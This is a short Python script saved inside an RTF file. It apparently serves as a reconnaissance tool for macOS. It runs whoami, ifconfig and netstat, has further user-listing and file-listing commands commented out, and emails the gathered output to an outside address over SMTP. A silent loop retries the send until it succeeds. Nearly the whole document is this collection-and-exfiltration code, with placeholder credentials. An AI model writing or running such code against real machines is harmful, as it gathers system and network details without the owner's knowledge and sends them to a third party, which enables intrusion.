{\rtf1\ansi\ansicpg1252\cocoartf1504\cocoasubrtf830
{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\f0\fs24 \cf0 import subprocess\
import smtplib\
\
#ls = subprocess.Popen("ls -R", shell=True, stdout=subprocess.PIPE).stdout.read()\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 #dscl = subprocess.Popen("dscl . list /Users", shell=True, stdout=subprocess.PIPE).stdout.read()\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 #sysPro = subprocess.Popen("system_profiler", shell=True, stdout=subprocess.PIPE).stdout.read()\
\
ifc = subprocess.Popen("ifconfig", shell=True, stdout=subprocess.PIPE).stdout.read()\
nst =  subprocess.Popen("netstat", shell=True, stdout=subprocess.PIPE).stdout.read()\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 who = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE).stdout.read()\
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
\cf0 \
#harvest =  who + ifc + nst + dscl + sysPro + ls\
\
#commented as time consuming processes and output is very verbose\
#TODO: add capacity to send text file as attachment\
\
#f = open('testSubProRecon.txt','w')\
#f.write(harvest)\
#f.close()\
\
body = who + ifc + nst\
\
msg = """From: sender@email\
To: recipient@email\
MIME-Version: 1.0\
Content-type: text\
Subject: test\
\
\
 """\
message = msg + body\
\
while True: \
	try: \
		server = smtplib.SMTP(\'91server\'92, port)\
		server.starttls()\
		server.login(\'91sender@email\'92,\'92password\'92)\
		server.sendmail('sender@email','recipient@email', message)\
		break\
	except: \
		#print("Error: unable to send email.  Trying again")\
		continue\
}